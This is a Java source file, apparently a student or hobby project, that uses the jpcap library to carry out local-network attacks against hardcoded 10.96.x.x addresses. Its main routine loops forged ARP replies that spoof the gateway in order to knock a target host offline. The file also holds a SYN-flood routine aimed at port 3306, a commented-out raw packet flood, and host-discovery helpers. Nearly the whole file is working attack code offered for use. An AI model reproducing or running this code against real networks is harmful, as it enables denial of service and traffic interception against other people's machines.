package com.test;


import java.awt.Container;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Arrays;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JTextField;

import jpcap.*;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

public class Attack {
	/*public static void main(String[] args) throws java.io.IOException {
		JpcapSender sender=JpcapSender.openDevice(Jpcap.getDeviceList()[2]);
		//build packet
		IPPacket ipp= new IPPacket(); 
		ipp.setIPv4Parameter(0,false,false,false,0,false,false,false,0,0,255,
		230, //230未定义协议
		new IPAddress("110.110.17.101"),
		new IPAddress("10.96.77.173"));
		ipp.data="0101011101".getBytes();
		//send packet
		while(true) {
			sender.sendPacket(ipp); 
			System.out.println("OK");
		}
	}*/
	static NetworkInterface[] devices = JpcapCaptor.getDeviceList();//得到主机A的网络设备列表
	
	@SuppressWarnings("unused")
	static byte[] getOtherMAC(String ip) throws IOException{
		JpcapCaptor jc = JpcapCaptor.openDevice(devices[0],2000,false,3000);
		JpcapSender sender = jc.getJpcapSenderInstance();
		InetAddress senderIP = InetAddress.getByName("10.96.33.232");	//主机A的IP地址
		InetAddress targetIP = InetAddress.getByName(ip);				//目标主机的IP地址
		byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};	//广播地址
		ARPPacket arp=new ARPPacket();	//开始构造一个ARP包
		arp.hardtype=ARPPacket.HARDTYPE_ETHER;		//硬件类型
		arp.prototype=ARPPacket.PROTOTYPE_IP;		//协议类型
		arp.operation=ARPPacket.ARP_REQUEST;                      //指明是ARP请求包
		arp.hlen=6;	//物理地址长度
		arp.plen=4;	//协议地址长度
		arp.sender_hardaddr=devices[0].mac_address;		//ARP包的发送端以太网地址	//源物理地址
		arp.sender_protoaddr=senderIP.getAddress();     //发送端IP地址	源IP地址
		arp.target_hardaddr=broadcast;		//目的端以太网地址	
		arp.target_protoaddr=targetIP.getAddress();	//目的端IP地址
		
		//封装成数据链路层的帧
		EthernetPacket ether=new EthernetPacket();	//构造以太网首部
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;               //帧类型
		ether.src_mac=devices[0].mac_address;	//以太网源地址
		ether.dst_mac=broadcast;                                                      //以太网目的地址
		arp.datalink=ether;
		
		sender.sendPacket(arp);	//send
		
		while(true){                                                //获取ARP回复包，从中提取出目的主机的MAC地址
		   Packet packet = jc.getPacket();
		   if(packet instanceof ARPPacket){
			   ARPPacket p=(ARPPacket)packet;
			   if(p==null){
				   throw new IllegalArgumentException(targetIP+" is not a local address");
			   }
			   if(Arrays.equals(p.target_protoaddr,senderIP.getAddress())){
				   System.out.println("get mac ok");
				   return p.sender_hardaddr;
			   }
		   }
			
		}
		
		
	}
	
	static byte[] stomac(String s) {  
        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };  
        String[] s1 = s.split("-");  
        for (int x = 0; x < s1.length; x++) {  
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);  
        }  
        return mac;  
    }
	
	static String macToString(byte[] s){
		String mac = "";
		System.out.println("BEGIN MAC TO STRING。。。");
		for (int i = 0; i < s.length; i++){
			String temp = Integer.toHexString(s[i] & 0xff);
			if(temp.length() == 1) temp = "0" + temp;	//补0
			mac += temp;
		}
		System.out.println("MAC TO STRING SUCCESSFULLY");
		return mac;
	}
	
	static String ipToString(byte[] s){
		String ip = "";
		for (int i = 0; i < s.length; i++){
			String temp = Integer.toString(s[i] & 0xff);
			if(temp.length() == 1) temp = "0" + temp;	//补0
			ip += temp;
		}
		return ip;
	}
	
	@SuppressWarnings("restriction")
	public static void ARPAttack(String ip) throws InterruptedException, IOException{
		JpcapCaptor jpcap = JpcapCaptor.openDevice(JpcapCaptor.getDeviceList()[0], 65535, false, 3000);
		jpcap.setFilter("arp", true);
		JpcapSender sender = JpcapSender.openDevice(JpcapCaptor.getDeviceList()[0]);
		
		
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;
		arp.prototype = ARPPacket.PROTOTYPE_IP;
		arp.operation = ARPPacket.ARP_REPLY;	//指明是ARP_REPLY回复包
		arp.hlen = 6;
		arp.plen = 4;
		
		//System.out.println(getWindowsMACAddress());
		
		byte[] srcmac = stomac("00-1C-23-2E-A7-0A"); // 假的MAC数组
		//arp.sender_hardaddr = devices[0].mac_address;
		//arp.sender_hardaddr = getOtherMAC("10.96.78.130");
		arp.sender_hardaddr = srcmac;
		//System.out.println(arp.sender_hardaddr);
		//System.out.println(macToString(arp.sender_hardaddr));
		arp.sender_protoaddr = InetAddress.getByName("10.96.0.1").getAddress();
		
		arp.target_hardaddr=getOtherMAC(ip);
		//arp.target_hardaddr="AAAAAAAAAAAA".getBytes();
		arp.target_protoaddr=InetAddress.getByName(ip).getAddress();
		
		System.out.println(macToString(getOtherMAC(ip)));
		
		//设置DLC帧
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac= srcmac;	//getOtherMAC("10.96.0.1");
		//ether.src_mac = "B888AAAABBCC".getBytes();
		ether.dst_mac=getOtherMAC(ip);
		//ether.dst_mac = "AAAAAAAAAAAA".getBytes();
		arp.datalink=ether;
		
		//sender.sendPacket(arp);
		//System.out.println("OK");
		// 发送ARP应答包   
        while (true) {  
            System.out.println("sending ARP..");  
            sender.sendPacket(arp);  
            Thread.sleep(2 * 1000);  
        }
	}
	
	public static void SYNFlood() throws IOException, InterruptedException{
		JpcapCaptor jpcap = JpcapCaptor.openDevice(JpcapCaptor.getDeviceList()[0], 65535, false, 3000);
		jpcap.setFilter("tcp", true);
		JpcapSender sender = JpcapSender.openDevice(JpcapCaptor.getDeviceList()[0]);
		
		TCPPacket tcp = new TCPPacket(6000, 3306, 0, 1, false, false, false, false, true, false, false, false, 0, 0);
		//设置DLC帧
		byte[] srcmac = stomac("00-1C-23-2E-A7-0A"); // 假的MAC数组
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac= srcmac;	//getOtherMAC("10.96.0.1");
		//ether.src_mac = "B888AAAABBCC".getBytes();
		ether.dst_mac=getOtherMAC("10.96.77.173");
		//ether.dst_mac = "AAAAAAAAAAAA".getBytes();
		tcp.datalink=ether;
		
		while (true) {  
            System.out.println("sending SYN TCP..");  
            sender.sendPacket(tcp);  
            Thread.sleep(2 * 1000);
        }
		
	}
	
	public static void findPC(String localhost) throws IOException{
		
		JpcapCaptor jc = JpcapCaptor.openDevice(devices[0],2000,false,3000);
		JpcapSender sender = jc.getJpcapSenderInstance();
		InetAddress senderIP = InetAddress.getByName(localhost);	//主机A的IP地址
		InetAddress targetIP = InetAddress.getByName("10.96.0.1");				//目标主机的IP地址
		byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};	//广播地址
		ARPPacket arp=new ARPPacket();	//开始构造一个ARP包
		arp.hardtype=ARPPacket.HARDTYPE_ETHER;		//硬件类型
		arp.prototype=ARPPacket.PROTOTYPE_IP;		//协议类型
		arp.operation=ARPPacket.ARP_REQUEST;                      //指明是ARP请求包
		arp.hlen=6;	//物理地址长度
		arp.plen=4;	//协议地址长度
		arp.sender_hardaddr=devices[0].mac_address;		//ARP包的发送端以太网地址	//源物理地址
		arp.sender_protoaddr=senderIP.getAddress();     //发送端IP地址	源IP地址
		arp.target_hardaddr=broadcast;		//目的端以太网地址	
		arp.target_protoaddr=targetIP.getAddress();	//目的端IP地址
		
		//封装成数据链路层的帧
		EthernetPacket ether=new EthernetPacket();	//构造以太网首部
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;               //帧类型
		ether.src_mac=devices[0].mac_address;	//以太网源地址
		ether.dst_mac=broadcast;                                                      //以太网目的地址
		arp.datalink=ether;
		
		sender.sendPacket(arp);	//send
		Thread t = new Thread(new AcceptThread(senderIP, jc));
		t.start();
	}
	
	public static void main(String[] args) throws IOException, InterruptedException{
		ARPAttack("10.96.91.56");
		/*JFrame frame = new JFrame("");
		frame.setBounds(300, 250, 400, 300);
		Container c = frame.getContentPane();
		c.setLayout(null);
		JTextField targetIP = new JTextField("10101010");
		targetIP.setBounds(10,10,80,15);
		
		JButton atk = new JButton("ARP断网攻击");
		atk.setBounds(100, 10, 25, 15);
		atk.addActionListener(new ActionListener(){
			@Override
			public void actionPerformed(ActionEvent e) {
				new Thread(new Runnable(){
					@Override
					public void run() {
						try {
							ARPAttack("10.96.91.56");
						} catch (InterruptedException e) {
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}).start();
			}
			
		});
		
		c.add(targetIP);
		c.add(atk);
		frame.show();*/
		
		
		 //SYNFlood();
		//System.out.println(Attack.macToString(getOtherMAC("10.96.77.173")));
		//findPC("10.96.102.218");
	}
	
	
	
}
